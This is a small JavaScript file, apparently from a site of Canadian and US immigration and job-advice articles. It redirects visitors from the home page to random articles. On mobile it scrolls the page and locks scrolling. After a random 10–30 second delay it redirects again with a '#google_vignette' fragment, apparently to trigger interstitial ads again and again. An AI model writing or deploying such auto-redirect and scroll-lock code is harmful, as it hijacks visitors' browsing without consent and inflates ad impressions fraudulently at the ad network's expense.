//START SETUP
const PATHS = [
	"/exploring-fruit-picking-job-opportunities-in-canada/",
	"/visa-validation-ensuring-the-legitimacy-of-your-canadian-immigration-papers/",
	"/safeguarding-against-fraudulent-canadian-visas-tips-and-precautions/",
	"/exploring-employment-opportunities-in-the-cleaning-industry-a-guide-for-visa-holders-in-the-usa/",
	"/charting-your-course-essential-steps-for-legal-migration-to-canada/",
	"/exploring-the-caretaker-job-market-in-canada/",
	"/sweeping-success-achieving-employment-as-a-cleaner-in-the-usa-with-visa-support/",
];

function getRandomPath() {
	const filteredHomePaths = PATHS.filter((x) => x != location.pathname);
	const randomIndex = Math.floor(Math.random() * filteredHomePaths.length);
	return filteredHomePaths[randomIndex];
}


if (location.pathname == "/home/" || location.pathname == "/home") {
	localStorage.setItem("scroll", "1");

	let newPath = getRandomPath()

	window.location.assign(newPath);
} else {
	if (localStorage.getItem("scroll")) {
		// Example usage
		if (window.innerWidth < 600) {
			setTimeout(() => {
				window.scrollTo(0, 250); // Scrolls to 500px from the top of the page
				document.body.style.overflow = "hidden";
			}, 300);
		}

		function generateRandomNumber(lowerLimit = 10000, upperLimit = 30000) {
			return (
				Math.floor(Math.random() * (upperLimit - lowerLimit + 1)) + lowerLimit
			);
		}
		setTimeout(function () {
			let newPath = getRandomPath() + "#google_vignette";;

			window.location.assign(newPath);
		}, generateRandomNumber());
	}
}

//END OF SETUP
